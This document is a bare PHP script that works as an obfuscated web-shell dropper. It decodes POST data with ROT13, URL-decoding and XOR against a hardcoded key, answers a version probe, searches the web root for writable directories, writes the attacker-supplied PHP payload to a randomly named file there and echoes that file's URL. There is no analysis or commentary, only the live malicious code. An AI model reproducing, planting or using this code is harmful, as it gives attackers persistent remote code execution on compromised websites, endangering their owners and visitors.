<?php

foreach ($_POST as $session_key => $value)
{
    if (strlen($session_key) == 16)
    {
        $value = str_split(rawurldecode(str_rot13($value)));
        $session_key = array_slice(str_split(str_repeat($session_key, (count($value)/16)+1)), 0, count($value));

        function encoder($val, $index, $session_key)
        {
            $auth = "muoemmhyvapncmik";
            return $val ^ $auth[$index % strlen($auth)] ^ $session_key;
        }

        $value = implode("", array_map("encoder", array_values($value), array_keys($value), array_values($session_key)));

        $value = @unserialize($value);

        if (@is_array($value))
        {
            $key = array_keys($value);
            $value = $value[$key[0]];

            if ($value === $key[0])
            {
                echo @serialize(Array("php" => @phpversion(), ));exit();
            }
            else {
                function listdirs($dir)
                {
                    static $alldirs = array();
                    $dirs = glob($dir . '/*', GLOB_ONLYDIR);
                    if (count($dirs) > 0) {
                        foreach ($dirs as $d) {
                            if (@is_writable($d)) {
                                $alldirs[] = $d;
                            }
                        }
                    }
                    foreach ($dirs as $dir) listdirs($dir);
                    return $alldirs;
                }

                $docroot = $_SERVER["DOCUMENT_ROOT"];

                $dirs = listdirs($docroot);
                $key = array_rand($dirs);
                $dest = $dirs[$key] . "/" . substr(md5(time()), 0, 8) . ".php";

                @file_put_contents($dest, $value);

                echo "http://" . $_SERVER["HTTP_HOST"] . substr($dest, strlen($docroot));

                exit();
            }
        }
    }
}
